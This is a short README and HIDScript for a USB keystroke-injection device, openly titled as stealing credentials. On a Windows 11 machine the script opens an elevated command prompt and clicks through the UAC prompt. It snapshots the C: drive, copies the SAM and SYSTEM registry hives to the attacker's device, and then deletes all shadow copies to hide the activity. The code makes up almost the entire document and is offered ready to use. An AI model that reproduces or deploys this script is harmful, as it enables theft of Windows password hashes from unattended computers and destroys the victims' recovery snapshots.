# Credentials - Steal SAM and System

## Description

This is a simple HIDScript that create a Shadow Volume Snapshot of C drive and copy SAM and SYSTEM files in you'r current directory.

## Requirement

1. First note this script has been created and tested under Windows 11 Build 22000.
2. I used a QWERTZ keyboard to do this ("ch" layout), so you may need to change that.
3. Change the "cd D:\\" command to your desired location where save the files. Basically it should be your rubber ducky device or whatever.
4. The shadow volume is set to "HarddiskVolumeShadowCopy1" based on the idea that the target computer hasn't created a Shadow Volume in the past. Otherwise, it can change to "HarddiskVolumeShadowCopy2" or whatever.

## Code

```bash
layout("ch")
press("GUI r")
delay(200)
type("powershell.exe start-process cmd -verb runas")
press("ENTER")
delay(1500)
press("LEFT")
press("ENTER")
delay(1000)
type("cd D:\\")
type("wmic shadowcopy call create Volume='C:\\'")
press("ENTER")
delay(3000)
type("copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\system32\\config\\sam .")
press("ENTER")
delay(1000)
type("copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\system32\\config\\system .")
press("ENTER")
delay(1000)
type("vssadmin delete shadows /All")
press("ENTER")
delay(500)
type("O")
press("ENTER")
delay(2000)
type("exit")
press("ENTER")
```